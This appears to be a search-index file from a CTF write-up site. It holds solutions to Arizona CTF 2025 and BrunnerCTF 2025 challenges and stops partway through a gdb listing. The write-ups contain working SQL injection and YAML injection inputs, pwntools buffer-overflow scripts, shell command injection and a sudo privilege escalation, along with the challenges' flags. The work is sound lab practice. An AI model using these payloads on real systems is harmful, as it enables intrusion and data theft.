{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Index","text":""},{"location":"#practice-compete","title":"Practice &amp; Compete","text":"<ul> <li>CTFLearn</li> <li>picoCTF</li> <li>pwn.college</li> <li>pwnable.kr for Pwning</li> <li>CTF.Hacker101 for Web Expoitation</li> <li>Cryptohack for Cryptography</li> <li>xss-game for XSS</li> <li>GoogleCTF Beginner's Quest</li> <li>OverTheWire Wargames</li> <li>CTFTime for Upcoming CTFs</li> </ul>"},{"location":"#concepts","title":"Concepts","text":"<ul> <li>CTF Handbook</li> <li>Intro to PWN</li> <li>Intro to Forensics</li> <li>Guide to Web Security</li> <li>PCAP Challenges</li> <li>RSA Attacks</li> <li>Prototype Pollution</li> <li>postMessage Vulnerabilities</li> <li>JS eval()</li> <li>Smashing the Stack for Fun and Profit</li> <li>Format Strings</li> <li>Server Side Template Injection</li> <li>Pyjail Cheatsheet</li> </ul>"},{"location":"#tools","title":"Tools","text":"<ul> <li>CyberChef</li> <li>Wireshark: TLS Decryption</li> <li>curl Cheatsheet</li> <li>nc Cheatsheet</li> <li>nmap Cheatsheet</li> <li>BurpSuite docs</li> <li>Online decryption and decoding</li> <li>Online decompiler</li> </ul> <p>Other Useful Links</p> <p>CTF Repos</p>"},{"location":"Arizona%20CTF%202025%20%28pwn.college%29/Linux/Hijack%20Me%21/","title":"Hijack Me!","text":"<p><code>challenge/run</code> runs a binary called <code>fortune</code></p> <p>Make a shell script containing <code>cat /flag</code>, name it \"fortune\" and give it necessary permissions</p> <p>Add the directory of binary to path, and run the challenge to claim the flag:</p> <pre><code>export PATH=`pwd`:$PATH\n/challenge/run\n</code></pre>"},{"location":"Arizona%20CTF%202025%20%28pwn.college%29/Web%20Security/Cowherders%201/","title":"Cowherders 1","text":"<ol> <li> <p>This is clearly vulnerable to SQLi:</p> <p><code>python def check_auth(username, password):     res = db.execute(f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\")     user = res.fetchone()     return user['username'] != None</code></p> <p>Go to <code>/login</code> and enter:</p> <p><code>text username: bigger_baron password: ' OR '1'='1</code></p> </li> <li> <p>Go to <code>/transfer</code> and transfer 50 cows to \"farmers\"</p> </li> <li>Log into \"farmers\" account. Now we have 52 cows, which satisfies the condition for flag</li> <li>Go to <code>/check_cows</code> to claim the flag</li> </ol>"},{"location":"Arizona%20CTF%202025%20%28pwn.college%29/Web%20Security/No%20Admin%20For%20You/","title":"No Admin For You","text":"<p>Server:</p> <pre><code>with open(\"/challenge/data.yml\", \"w\") as o:\n    o.write(\"users:\\n\")\n    o.write(\"  admin:\\n\")\n    o.write(\"    disabled: true\\n\")\n    o.write(\"  hacker:\\n\")\n    o.write(\"    disabled: false\\n\")\n    o.write(\"logs:\\n\")\n\ndef panic(msg):\n    with open(\"/challenge/data.yml\", \"a\") as o:\n        o.write(f\"- {msg}\")\n    flask.abort(400, msg)\n\n@app.route(\"/\", methods=[\"GET\"])\ndef challenge():\n    users = yaml.safe_load(open(\"/challenge/data.yml\"))[\"users\"]\n    user = flask.request.args.get(\"user\")\n\n    if user not in users:\n        panic(f\"unknown user {user}\")\n    if users[user].get(\"disabled\", False):\n        panic(f\"disabled user {user}\")\n\n    if user == \"admin\":\n        return f\"\"\"\n            &lt;html&gt;&lt;body&gt;\n            YES! Your flag: {open(\"/flag\").read()}\n            &lt;/body&gt;&lt;/html&gt;\n        \"\"\"\n    else:\n        return f\"\"\"\n            &lt;html&gt;&lt;body&gt;\n            NO FLAG FOR YOU, HACKER!\n            &lt;/body&gt;&lt;/html&gt;\n        \"\"\"\n</code></pre> <p>We need to enable admin; can inject yaml through the panic() function: <code>/?user=random%0Ausers%3A%0A%20%20admin%3A%0A%20%20%20%20disabled%3A%20false</code></p> <pre><code>random\nusers:\n  admin:\n    disabled: false\n</code></pre> <p>Result YAML:</p> <pre><code>users:\n  admin:\n    disabled: true\n  hacker:\n    disabled: false\nlogs:\n- unknown user random\nusers:\n  admin:\n    disabled: false\n</code></pre> <p>Go to <code>/?user=admin</code> to claim the flag!</p>"},{"location":"BrunnerCTF%202025/Crypto/Half-Baked/","title":"Half-Baked","text":"<pre><code>Boss wanted our cake webshop secured with RSA and said I should remember to use some good primes.\nNot sure what that means, but he specifically asked for 2, I guess to save money.\nSounded easy enough, but now the whole system feels a bit half-baked \ud83d\ude15\n</code></pre> <p>points: <code>100</code></p> <p>solves: <code>433</code></p> <p>author: <code>Nissen</code></p> <p>N, e, c given. N is EVEN, actually it is a power of 2. So phi is just N/2</p>"},{"location":"BrunnerCTF%202025/Crypto/Half-Baked/#proof-that-varphin-tfracn2-when-n-is-a-power-of-2","title":"Proof that \\(\\varphi(N) = \\tfrac{N}{2}\\) when \\(N\\) is a power of 2","text":"<p>Let \\(N = 2^k\\) for some integer \\(k \\geq 1\\).</p> <p>Euler\u2019s totient function is given by  </p> \\[ \\varphi(N) = N \\prod_{p \\mid N}\\left(1 - \\frac{1}{p}\\right), \\] <p>where the product runs over all distinct prime divisors of \\(N\\).</p> <p>Since the only prime divisor of \\(2^k\\) is \\(2\\), we get  </p> \\[ \\varphi(2^k) = 2^k \\left(1 - \\frac{1}{2}\\right). \\] \\[ \\varphi(2^k) = 2^k \\cdot \\frac{1}{2} = 2^{k-1}. \\] \\[ \\varphi(N) = \\frac{N}{2}. \\]"},{"location":"BrunnerCTF%202025/Crypto/Half-Baked/#decryption-script","title":"Decryption script","text":"<pre><code>from Crypto.Util.number import long_to_bytes, inverse\n\nN = 2999882211429630485883650302877390551374775896896788078868325571891218714007953558505041388044334470201821965796391409921668122818083570668568660678895962925314655342154580738160357641047430373917156721861167458749434940591017306495880180805391185380307427539761080193213111534709378234670214284858143824384128077373871882033779166821558334466322908873171079631967672353755842618738501413251304204009472\ne = 65537\nc = 406899880095774364291729342954053590589397159355690238625035627993181937179155345315119680672959072539867481892078815991872758149967716015787715641627573675995588117336214614607141418649060621601912927211427125930492034626696064268888134600578061035823593102305974307471288655933533166631878786592162718700742194241218161182091193661813824775250046054642533470046107935752737753871183553636510066553725\n\nphi = N//2\nd = inverse(e, phi)\nm = pow(c, d, N)\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"BrunnerCTF%202025/OSINT/There%20Is%20a%20Lovely%20Land/","title":"There Is a Lovely Land","text":"<pre><code>The Danish national anthem is called \"Der er et yndigt land\" (\"There Is a Lovely Land\"), and I fully agree.\n\nA friend of mine took this picture, but I don't know the name of the bridge! Please help me find it so I can go see it!\n\nFlag format: brunner{&lt;bridge name in Danish in lowercase&gt;}\n</code></pre> <p>points: <code>100</code></p> <p>solves: <code>526</code></p> <p>author: <code>Toxicd</code></p> <p></p> <p>Using Google Lens directly points us to Sallingsund Bridge (Sallingsundbroen)</p>"},{"location":"BrunnerCTF%202025/Pwn/Othello%20Villains/","title":"Othello Villains","text":"<pre><code>The Othello villains stole our sacred Brunner recipe! Luckily, they are unable to write secure code, please retrieve the recipe from their (in)secure vault!\n</code></pre> <p>points: <code>100</code></p> <p>solves: <code>286</code></p> <p>author: <code>olexmeister</code></p> <p>This challenge is similar to Dat Overflow Dough, except the source code is not given</p> <pre><code>(gdb) info functions\nAll defined functions:\n\nNon-debugging symbols:\n0x0000000000401000  _init\n0x00000000004010a0  puts@plt\n0x00000000004010b0  fread@plt\n0x00000000004010c0  fflush@plt\n0x00000000004010d0  setvbuf@plt\n0x00000000004010e0  fopen@plt\n0x00000000004010f0  __isoc99_scanf@plt\n0x0000000000401100  exit@plt\n0x0000000000401110  _start\n0x0000000000401140  _dl_relocate_static_pie\n0x0000000000401150  deregister_tm_clones\n0x0000000000401180  register_tm_clones\n0x00000000004011c0  __do_global_dtors_aux\n0x00000000004011f0  frame_dummy\n0x00000000004011f6  init\n0x000000000040125b  main\n0x00000000004012ae  win\n0x0000000000401330  _fini\n</code></pre> <p><code>win()</code> at 0x00000000004012ae</p> <pre><code>(gdb) disas main\nDump of assembler code for function main:\n   0x000000000040125b &lt;+0&gt;: endbr64\n   0x000000000040125f &lt;+4&gt;: push   rbp\n   0x0000000000401260 &lt;+5&gt;: mov    rbp,rsp\n   0x0000000000401263 &lt;+8&gt;: sub    rsp,0x30\n   0x0000000000401267 &lt;+12&gt;:    mov    DWORD PTR [rbp-0x24],edi\n   0x000000000040126a &lt;+15&gt;:    mov    QWORD PTR [rbp-0x30],rsi\n   0x000000000040126e &lt;+19&gt;:    lea    rax,[rip+0xd93]        # 0x402008\n   0x0000000000401275 &lt;+26&gt;:    mov    rdi,rax\n   0x0000000000401278 &lt;+29&gt;:    call   0x4010a0 &lt;puts@plt&gt;\n   0x000000000040127d &lt;+34&gt;:    mov    rax,QWORD PTR [rip+0x2ddc]        # 0x404060 &lt;stdout@GLIBC_2.2.5&gt;\n   0x0000000000401284 &lt;+41&gt;:    mov    rdi,rax\n   0x0000000000401287 &lt;+44&gt;:    call   0x4010c0 &lt;fflush@plt&gt;\n   0x000000000040128c &lt;+49&gt;:    lea    rax,[rbp-0x20]\n   0x0000000000401290 &lt;+53&gt;:    mov    rsi,rax\n   0x0000000000401293 &lt;+56&gt;:    lea    rax,[rip+0xdaa]        # 0x402044\n   0x000000000040129a &lt;+63&gt;:    mov    rdi,rax\n   0x000000000040129d &lt;+66&gt;:    mov    eax,0x0\n   0x00000000004012a2 &lt;+71&gt;:    call   0x4010f0 &lt;__isoc99_scanf@plt&gt;\n   0x00000000004012a7 &lt;+76&gt;:    mov    eax,0x0\n   0x00000000004012ac &lt;+81&gt;:    leave\n   0x00000000004012ad &lt;+82&gt;:    ret\n</code></pre> <p>Buffer of length 0x20</p> <pre><code>from pwn import *\n\nRECIPE_BUFFER_SIZE = 0x20\nRBP_SIZE = 0x8\nSECRET_ADDRESS = 0x00000000004012ae\nPROMPT = \"\"\n\nUSE_REMOTE = False\nREMOTE_HOST = \"\"\nREMOTE_PORT = 0\n\nif USE_REMOTE:\n    io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)\nelse:\n    e = ELF(\"./othelloserver\")\n    io = e.process()\n\npayload = b\"A\" * RECIPE_BUFFER_SIZE\npayload += b\"B\" * RBP_SIZE\npayload += p64(SECRET_ADDRESS)\n\nio.recvuntil(PROMPT.encode())\nio.sendline(payload)\nio.interactive()\n</code></pre>"},{"location":"BrunnerCTF%202025/Reverse%20Engineering/Grandma%27s%20Predictable%20Cookies/","title":"Grandma's Predictable Cookies","text":"<pre><code>Grandma encrypted her secret cookie recipe using her \"special ingredient\" a random number generator seeded with the exact time she baked it.\n\nShe thought it was uncrackable. But little did she know: Using the same oven clock every time makes your cookies easy to reverse-engineer.\n\nCan you recover her delicious secret?\n</code></pre> <p>points: <code>100</code></p> <p>solves: <code>232</code></p> <p>author: <code>H4N5</code></p> <p>We are given a binary, and a <code>flag.enc</code> file:</p> <pre><code>Encrypted flag: 3ec63cc41f1ac1980651726ab3ce2948882b879c19671269963e39103c83ebd6ef173d60c76ee5\nEncryption time (approx): 1755860000\n</code></pre> <p>Decompiled using BinaryNinja on dogbolt:</p> <pre><code>time_t rax_6 = get_current_time_danish();\nsrand(rax_6);\n\nfor (int32_t i = 0; i &lt;= 0x3e7; i += 1)\n    rand();\n\nint64_t var_58_1 = rax_1 - 1;\nvoid* rsp_1 = &amp;buf - COMBINE(0, rax_1 + 0xf) / 0x10 * 0x10;\n\nfor (void* i_1 = nullptr; i_1 &lt; rax_1; i_1 += 1)\n{\n    int32_t rax_19 = rand();\n    *(i_1 + rsp_1) = *(i_1 + &amp;buf) ^ rax_19;\n}\n\nprintf(\"Encrypted flag: \");\n\nfor (void* i_2 = nullptr; i_2 &lt; rax_1; i_2 += 1)\n    printf(\"%02x\", *(i_2 + rsp_1));\n\nprintf(\"\\nEncryption time (approx): %ld\\n\", rax_6 / 0x2710 * 0x2710);\n</code></pre> <ol> <li>Timestamp is used as seed of random number generator. This timestamp, after decreasing precision, is printed at the end: 1755860000</li> <li>1000 (0 to 0x3e7=999) random integers are generated</li> <li>Each byte of the flag is XOR'd with a newly generated random number, and the result's hex is printed</li> </ol> <p><code>decode.c</code>:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;time.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char *argv[])\n{\n  time_t timestamp = atoi(argv[1]);\n  char hexstr[1024] = \"3ec63cc41f1ac1980651726ab3ce2948882b879c19671269963e39103c83ebd6ef173d60c76ee5\";\n\n  srand(timestamp);\n  for (int i = 0; i &lt;= 999; ++i) rand();\n  size_t len = strlen(hexstr);\n\n  for (size_t i = 0; i &lt; len; i += 2)\n  {\n    unsigned int byte;\n    sscanf(hexstr + i, \"%2x\", &amp;byte);\n    int v5 = rand();\n    byte ^= (unsigned int)(v5);\n    printf(\"%c\", byte);\n  }\n  printf(\"\\n\");\n\n  return 0;\n}\n</code></pre> <p>Brute force all the possible timestamps, flag is one of the outputs:</p> <pre><code>#!/bin/bash\n\nCFILE=\"decode.c\"\n\ngcc \"$CFILE\" -o decode\n\nfor sec in {1755860000..1755869999}; do\n    ./decode $sec\ndone\n</code></pre>"},{"location":"BrunnerCTF%202025/Reverse%20Engineering/Trippi%20Troppa%20Chaos/","title":"Trippi Troppa Chaos","text":"<pre><code>The baker got infected with Italian brainrot and obfuscated our flag encoder with memes and nested functions. Can you help us find our flag?\n</code></pre> <p>points: <code>100</code></p> <p>solves: <code>371</code></p> <p>author: <code>ha1fdan</code></p> <p>Given <code>output.txt</code> and <code>trippi_troppa_sus.py</code>:</p> <pre><code>#!/usr/bin/env python3\nimport sys as _tralalero_tralala_impostor_____\n(lambda _bombardiro_crocodilo___: [\n    setattr(__builtins__, '__boneca_ambalabu_toilet____', __import__('base64').b85encode),\n    setattr(__builtins__, '___trippa_troppa_mewing___', __import__('hashlib').sha256),\n    setattr(__builtins__, '__tung_tung_sahur_cycle_____', __import__('itertools').cycle),\n    setattr(__builtins__, '____pinguino_arrabiato_seed____', __import__('random').seed)\n][_bombardiro_crocodilo___] and None)(0) or ____pinguino_arrabiato_seed____(69420)\n\ndef ___ranocchio_turbina_function_factory____():\n    def ____liril\u00ec_ril\u00e0_final_boss_____():\n        def _____trippi_troppa_skibidi_____():\n            def ______crocodina_gigachad_nested______():\n                def _______tralala_alpha_transformation_______():\n                    def ________boneca_beta_elimination________():\n                        def _________sahur_sigma_activities_________():\n                            def __________bombardiro_mewing__________():\n                                def ___________trippa_no_cap___________():\n                                    def ____________tung_bussin_respectfully____________():\n                                        def _____________tralalero_slay_queen_energy_____________():\n                                            __fanum_tax_pinguino____ = lambda ___cringe_normie_bombardiro___, ____based_chad_crocodilo____: (lambda ____uwu_owo_tralalero____: [__c__ for __c__ in ____uwu_owo_tralalero____])(\n                                                [___x___ ^ ___y___ for ___x___, ___y___ in zip(___cringe_normie_bombardiro___, __tung_tung_sahur_cycle_____(____based_chad_crocodilo____))]\n                                            )\n\n                                            def ____boneca_ambalabu_university____(___x_trippa___, ___y_troppa___):\n                                                return (lambda ____bruh_moment_liril\u00ec____: ____bruh_moment_liril\u00ec____.digest()[:len(___y_troppa___)])(\n                                                    ___trippa_troppa_mewing___(\n                                                        ((___x_trippa___.decode() if isinstance(___x_trippa___, bytes) else ___x_trippa___) + \n                                                         (___y_troppa___.decode() if isinstance(___y_troppa___, bytes) else ___y_troppa___)).encode()\n                                                    )\n                                                )\n\n                                            def ____tralalero_griddy_dance____(___x_ranocchio___):\n                                                return (lambda ____fortnite_bombardiro_pass____: \n                                                       [___c_crocodina___ for ___c_crocodina___ in ____fortnite_bombardiro_pass____]\n                                                )([((___c_sahur___ * 7) % 256) for ___c_sahur___ in ___x_ranocchio___])\n\n                                            def ____tung_reverse_uno_card____(___x_pinguino___):\n                                                return (lambda ____amogus_sus_trippi____: ____amogus_sus_trippi____[::-1])(___x_pinguino___)\n\n                                            def ____dead_meme_boneca_graveyard____():\n                                                ____poggers_tralala____, ____chungus_ril\u00e0____, ____keanu_troppa____ = 1337, 420, 9000\n                                                for ___i_bombardiro___ in (lambda ___x_crocodilo___: range(___x_crocodilo___))(5):\n                                                    ____poggers_tralala____ = (____poggers_tralala____ * ____chungus_ril\u00e0____ + ____keanu_troppa____) % (___i_bombardiro___ + 7)\n                                                return ____poggers_tralala____\n\n                                            def ____touch_grass_tralalero_function____():\n                                                try:\n                                                    with open(\"flag.txt\", \"rb\") as ____yeet_file_ambalabu____:\n                                                        ____cringe_flag_pinguino____ = ____yeet_file_ambalabu____.read()\n                                                except:\n                                                    return \"L + ratio + skill issue + no tralalero for you\"\n\n                                                ____sussy_key_bombardiro____ = b\"skibidi\"\n\n                                                ____step_one_boneca____ = ____boneca_ambalabu_university____(____sussy_key_bombardiro____, ____sussy_key_bombardiro____)\n                                                ____step_two_sahur____ = bytes(__fanum_tax_pinguino____(____cringe_flag_pinguino____, ____step_one_boneca____))\n                                                ____step_three_trippa____ = bytes(____tralalero_griddy_dance____(____step_two_sahur____))\n                                                ____step_four_troppa____ = ____tung_reverse_uno_card____(____step_three_trippa____)\n                                                ____final_boss_crocodina____ = __boneca_ambalabu_toilet____(____step_four_troppa____).decode()\n\n                                                return ____final_boss_crocodina____\n\n                                            return ____touch_grass_tralalero_function____\n                                        return _____________tralalero_slay_queen_energy_____________\n                                    return ____________tung_bussin_respectfully____________\n                                return ___________trippa_no_cap___________\n                            return __________bombardiro_mewing__________\n                        return _________sahur_sigma_activities_________\n                    return ________boneca_beta_elimination________\n                return _______tralala_alpha_transformation_______\n            return ______crocodina_gigachad_nested______\n        return _____trippi_troppa_skibidi_____\n    return ____liril\u00ec_ril\u00e0_final_boss_____\n\nif __name__ == \"__main__\":\n    print((lambda ___x_tralalero___: ___x_tralalero___()()()()()()()()()()()())(___ranocchio_turbina_function_factory____))\n</code></pre> <p>Simplified <code>encrypt.py</code>:</p> <pre><code>import base64\nimport hashlib\nimport itertools\nimport random\n\nrandom.seed(69420)\n\ndef func2(text, key):\n    return (x ^ y for x, y in zip(text, (key * ((len(text) // len(key)) + 1))[:len(text)]))\n\ndef func1(x, y):\n    if isinstance(x, bytes): x = x.decode()\n    if isinstance(y, bytes): y = y.decode()\n    return hashlib.sha256((x + y).encode()).digest()[:len(y)]\n\ndef func3(text):\n    return ((c * 7) % 256 for c in text)\n\ndef func4(text):\n    return text[::-1]\n\ndef func0():\n    with open(\"flag.txt\", \"rb\") as flag_file:\n        flag = flag_file.read()\n\n    key = b\"skibidi\"\n\n    step_one = func1(key, key)\n    step_two = bytes(func2(flag, step_one))\n    step_three = bytes(func3(step_two))\n    step_four = func4(step_three)\n    final_step = base64.b85encode(step_four).decode()\n\n    return final_step\n\nif __name__ == \"__main__\":\n    print(func0())\n</code></pre> <p>Reverse logic to <code>decrypt.py</code>:</p> <pre><code>import base64\nimport hashlib\n\ndef func2(text, key):\n    return (x ^ y for x, y in zip(text, (key * ((len(text) // len(key)) + 1))[:len(text)]))\n\ndef func1(x, y):\n    if isinstance(x, bytes): x = x.decode()\n    if isinstance(y, bytes): y = y.decode()\n    return hashlib.sha256((x + y).encode()).digest()[:len(y)]\n\ndef func3_inv(text):\n    inv7 = pow(7, -1, 256)\n    return bytes((c * inv7) % 256 for c in text)\n\ndef func4(text):\n    return text[::-1]\n\ndef func0():\n    with open(\"output.txt\") as f:\n        encoded = f.read().strip()\n    key = b\"skibidi\"\n    step1 = func1(key, key)\n\n    step4 = base64.b85decode(encoded)\n    step3 = func4(step4)\n    step2 = func3_inv(step3)\n    original_flag = bytes(func2(step2, step1))\n    return original_flag\n\nif __name__ == \"__main__\":\n    print(func0().decode(errors=\"ignore\"))\n</code></pre>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/BakeDown/","title":"BakeDown","text":"<p>Mobile</p> <pre><code>I just shipped the very first build of my BakeDown app. I haven't done much with it yet, but I did pack it with a few nice resources already.\n\nTry loading it onto your phone or an emulator to try it out!\n\nOh and btw, did you know an APK is just a ZIP file with assembled Java code and resources like strings, fonts, and images? I heard apktool might be a good tool for decoding the contents!\n</code></pre> <p>points: <code>50</code></p> <p>solves: <code>166</code></p> <p>author: <code>KyootyBella</code></p> <pre><code>apktool d BakeDown.apk\ncd BakeDown/\n</code></pre> <p>Search in text:</p> <pre><code>grep -Ri \"brunner{\" .\n./res/values/strings.xml:    &lt;string name=\"flag_part_1\"&gt;brunner{Th1s_Sh0uld_B3_Th3_&lt;/string&gt;\n</code></pre> <p>Search for images:</p> <pre><code>find . -type f \\( -iname \"*.png\" -o -iname \"*.jpg\" -o -iname \"*.webp\" \\)\n.\n.\n./res/drawable/cake.png\n.\n.\n</code></pre> <p></p>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/Baker%20Brian/","title":"Baker Brian","text":"<p>Reverse Engineering</p> <pre><code>Baker Brian says he has a plan to make him super rich, but he refuses to share any details \ud83d\ude20 Can you access his Cake Vault where he keeps all his business secrets?\n</code></pre> <p>points: <code>30</code></p> <p>solves: <code>555</code></p> <p>author: <code>Nissen</code></p> <p>We are given a file <code>auth.py</code>, which is used to check username and password on the server where the flag is</p> <pre><code>if username != \"Br14n_th3_b3st_c4k3_b4k3r\":\n    print(\"\u274c Go away, only Baker Brian has access!\")\n    exit()\n</code></pre> <p>So, Username: <code>Br14n_th3_b3st_c4k3_b4k3r</code></p> <pre><code>words = password.split(\"-\")\n\nif not (\n    len(words) &gt; 0 and\n    words[0] == \"red\"\n):\n    print(\"\u274c Word 1: Wrong - get out!\")\n    exit()\n</code></pre> <p>Password: <code>red-</code></p> <pre><code>if not (\n    len(words) &gt; 1 and\n    words[1][::-1] == \"yromem\"\n):\n    print(\"\u274c Word 2: Wrong - get out!\")\n    exit()\n</code></pre> <p>Password: <code>red-memory-</code></p> <pre><code>if not (\n    len(words) &gt; 2 and\n    len(words[2]) == 5 and\n    words[2][0] == \"b\" and\n    words[2][1] == \"e\" and\n    words[2][2:4] == \"r\" * 2 and\n    words[2][-1] == words[1][-1]\n):\n    print(\"\u274c Word 3: Wrong - get out!\")\n    exit()\n</code></pre> <p>Password: <code>red-memory-berry-</code></p> <pre><code>if not (\n    len(words) &gt; 3 and\n    words[3] == words[0][:2] + words[1][:3] + words[2][:3]\n):\n    print(\"\u274c Word 4: Wrong - get out!\")\n    exit()\n</code></pre> <p>Password: <code>red-memory-berry-remember</code></p>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/Based%20Brunner/","title":"Based Brunner","text":"<p>Misc</p> <pre><code>Brunsviger is just so based, I think I could eat it in any form - from binary to decimal!\n</code></pre> <p>points: <code>50</code></p> <p>solves: <code>331</code></p> <p>author: <code>Nissen</code></p> <p><code>based.txt</code> and <code>encode.py</code> given:</p> <pre><code>def encode_char(ch: str, base: int) -&gt; str:\n    \"\"\"\n    Encode a single character into a string of digits in the given base\n    \"\"\"\n    value = ord(ch)\n    digits = []\n    while value &gt; 0:\n        digits.append(str(value % base))\n        value //= base\n\n    return \"\".join(reversed(digits))\n\n\nwith open(\"flag.txt\") as f:\n    text = f.read().strip()\n\n# Encode the text with all bases from decimal to binary\nfor base in range(10, 1, -1):\n    text = \" \".join(encode_char(ch, base) for ch in text)\n\nwith open(\"based.txt\", \"w\") as f:\n    f.write(text)\n</code></pre> <p>Reverse logic to <code>decode.py</code>:</p> <pre><code>def encode_char(ch: str, base: int) -&gt; str:\n    \"\"\"\n    Encode a single character into a string of digits in the given base\n    \"\"\"\n    value = ord(ch)\n    digits = []\n    while value &gt; 0:\n        digits.append(str(value % base))\n        value //= base\n\n    return \"\".join(reversed(digits))\n\n\nwith open(\"based.txt\") as f:\n    text = f.read().strip()\n\nfor base in range(2, 11):\n    curr = \"\"\n    nums = []\n    for c in text.split():\n        if c == encode_char(' ', base):\n            nums.append(curr)\n            curr = \"\"\n        else:\n            ascii = int(c, base)\n            # print(ascii)\n            curr += chr(ascii)\n\n    nums.append(curr)\n    text = \" \".join(nums)\n\nprint(text)\n</code></pre>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/Caffeine/","title":"Caffeine","text":"<p>Boot2root</p>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/Caffeine/#user","title":"User","text":"<pre><code>This new coffee shop recently opened and you've been waiting too long for your daily caffeine injection! Can you find a way to see a little more than just your order status?\n\nThe user flag is in a file called user.txt.\n</code></pre> <p>points: <code>50</code></p> <p>solves: <code>310</code></p> <p>author: <code>Quack</code></p> <p></p> <p>On checking, the text box at right side can be used for RCE</p> <pre><code>Order Status for #; ls\nhint.txt\nindex.php\norders.log\nuser.txt\n</code></pre> <pre><code>Order Status for #; cat user.txt\nbrunner{C0Ff33_w1Th_4_51d3_0F_c0MM4nD_1nj3Ct10n!}\n</code></pre>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/Caffeine/#root","title":"Root","text":"<pre><code>Now that you have access to their system, is there any way you can escalate your privileges and read the final flag?\n\nThe root flag is located in /root/root.txt.\n</code></pre> <p>points: <code>50</code></p> <p>solves: <code>203</code></p> <p>author: <code>Quack</code></p> <pre><code>Order Status for #; cat /root/root.txt\nNo order found with ID #; cat /root/root.txt\n\nOrder Status for #; sudo cat /root/root.txt\nNo order found with ID #; sudo cat /root/root.txt\n</code></pre> <pre><code>Order Status for #; cat hint.txt\nAre there any files you *sudo'ent* (shouldn't) be able to run as a normal user?\nThe root flag is located at /root/root.txt\n</code></pre> <p>The hint indicates towards commands which can be run with sudo without a password</p> <pre><code>Order Status for #; sudo -l\nMatching Defaults entries for www-data on ctf-caffeine-user-5428ae29c619f229-cffdd5566-llq4p:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on ctf-caffeine-user-5428ae29c619f229-cffdd5566-llq4p:\n    (ALL) NOPASSWD: /usr/local/bin/brew\n</code></pre> <p><code>brew</code>..hmmm</p> <pre><code>Order Status for #; sudo brew /root/root.txt\n   ( (\n    ) )\n   ( (\n  .-'--.\n  |\u25c9.\u25c9|  \n  |    |  \n  '~~~~'  \n   ROOT PRIVILEGES DETECTED\n   JavaJack's *Special Reserve* Brew\n\n  Brewing your file reading...\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nbrunner{5uD0_pR1V1L3g35_T00_h0t_F0r_J4v4_J4CK!}\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n    ) )\n   ( (\n  .-'-.\n  |\u203c.\u203c|  \n  |   |  \n  '~~~'  \n   Root Brew Successful!\n</code></pre>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/Cookie%20Jar/","title":"Cookie Jar","text":"<p>Web</p> <pre><code>We just got our hands on grandma's legendary cookie jar! What delicious treats could she be hiding here?\n</code></pre> <p>points: <code>40</code></p> <p>solves: <code>610</code></p> <p>author: <code>Quack</code></p> <p></p> <p>Inspecting the cookies we find <code>isPremium = false</code> \\ Setting it to <code>true</code> and reloading displays the flag</p>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/Dat%20Overflow%20Dough/","title":"Dat Overflow Dough","text":"<p>Pwn</p> <pre><code>Our new intern has only coded in memory safe languages, but we're trying to optimize, so he has been tasked with re-writing our dough recipe-application in C!\n\nHe sent his code to our senior dev for review who added some comments in the code. Upon receiving the reviewed code, the intern accidentally pushed it to production instead of fixing anything.\n</code></pre> <p>points: <code>50</code></p> <p>solves: <code>258</code></p> <p>author: <code>0xjeppe</code></p> <p>We are provided with a bunch of files:</p> <ul> <li><code>code-review.md</code>: tells that the memory addresses of functions are static</li> <li><code>recipe.c</code>: tells that <code>vulnerable_dough_recipe()</code> is prone to buffer overflow; <code>secret_dough_recipe()</code> is the function we need to call to get the flag</li> <li><code>exploit.py</code>: sample pwntools code to overwrite return address</li> <li><code>exploit</code>: binary</li> <li><code>flag.txt</code>: redacted file to test payload locally</li> </ul> <pre><code>(gdb) set disassembly-flavor intel\n(gdb) disas vulnerable_dough_recipe \nDump of assembler code for function vulnerable_dough_recipe:\n   0x00000000004011ff &lt;+0&gt;: endbr64\n   0x0000000000401203 &lt;+4&gt;: push   rbp\n   0x0000000000401204 &lt;+5&gt;: mov    rbp,rsp\n   0x0000000000401207 &lt;+8&gt;: sub    rsp,0x10\n   0x000000000040120b &lt;+12&gt;:    lea    rax,[rip+0xe06]        # 0x402018\n   0x0000000000401212 &lt;+19&gt;:    mov    rdi,rax\n   0x0000000000401215 &lt;+22&gt;:    call   0x401080 &lt;puts@plt&gt;\n   0x000000000040121a &lt;+27&gt;:    lea    rax,[rbp-0x10]\n   0x000000000040121e &lt;+31&gt;:    mov    rdi,rax\n   0x0000000000401221 &lt;+34&gt;:    mov    eax,0x0\n   0x0000000000401226 &lt;+39&gt;:    call   0x401090 &lt;gets@plt&gt;\n   0x000000000040122b &lt;+44&gt;:    nop\n   0x000000000040122c &lt;+45&gt;:    leave\n   0x000000000040122d &lt;+46&gt;:    ret\nEnd of 